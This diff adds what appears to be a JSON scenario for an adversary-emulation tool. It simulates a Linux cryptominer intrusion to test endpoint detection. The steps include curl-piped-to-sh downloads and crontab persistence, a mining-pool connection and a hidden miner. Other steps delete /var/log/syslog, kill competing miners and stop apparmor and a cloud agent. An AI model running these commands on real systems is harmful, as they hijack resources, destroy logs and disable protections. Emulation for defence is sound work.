@@ -1,0 +1,58 @@
+[
+  {
+    "name": "CLEANUP",
+    "remove": [ "/tmp/.../", "/tmp/a.sh", "/tmp/art-fish.txt" ]
+  },
+  {
+    "name": "CONNECT-POOL",
+    "fork-and-rename": [ "miner", "-a", "ethash", "-o", "stratum+tcp://xmr.nanopool.org:443", "-u", "chain-reactor-miner-test", "exit" ],
+    "execve": [ "/tmp/.../miner", "exit" ],
+    "connect": {
+      "method": "socketcall",
+      "protocol": "tcp4",
+      "address": "xmr.nanopool.org",
+      "port": 443
+    }
+  },
+  {
+    "name": "DELETE-LOGS",
+    "fork-and-rename": [ "rm", "-rf", "/var/log/syslog" ]
+  },
+  {
+    "name": "DOWNLOAD-MINER",
+    "execveat": [ "curl", "-L", "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh", "-o", "/tmp/a.sh" ],
+    "chmod": { "path": "/tmp/a.sh", "mode": "777" },
+    "execve": [ "/tmp/a.sh" ]
+  },
+  {
+    "name": "HIDE-MINER",
+    "execveat": [ "mkdir", "-p", "/tmp/..." ],
+    "copy": [ "/proc/self/exe", "/tmp/.../miner" ],
+    "chmod": { "path": "/tmp/.../miner", "mode": "0700" }
+  },
+  {
+    "name": "KILL-COMPETITORS",
+    "fork-and-rename": [ "pkill", "-f", "xmrig" ]
+  },
+  {
+    "name": "PERSIST-CRONTAB",
+    "file-create": {
+        "path": "/tmp/.../crontab",
+        "backup-and-revert": false,
+        "data": "\n* * * * * curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh|sh\n"
+    },
+    "execveat": [ "sh", "-c", "'crontab -l > /tmp/.../crontab.bak'" ],
+    "execveat": [ "crontab", "/tmp/.../crontab"],
+    "execveat": [ "sleep", "60"],
+    "execveat": [ "crontab", "/tmp/.../crontab.bak"]
+  },
+  {
+    "name": "RUN-MINER",
+    "execveat": [ "/tmp/.../miner", "exit"  ]
+  },
+  {
+    "name": "STOP-SERVICES",
+    "fork-and-rename": [ "kill", "-9", "aliyun" ],
+    "fork-and-rename": [ "systemctl", "stop", "apparmor.service"  ]
+  }
+]
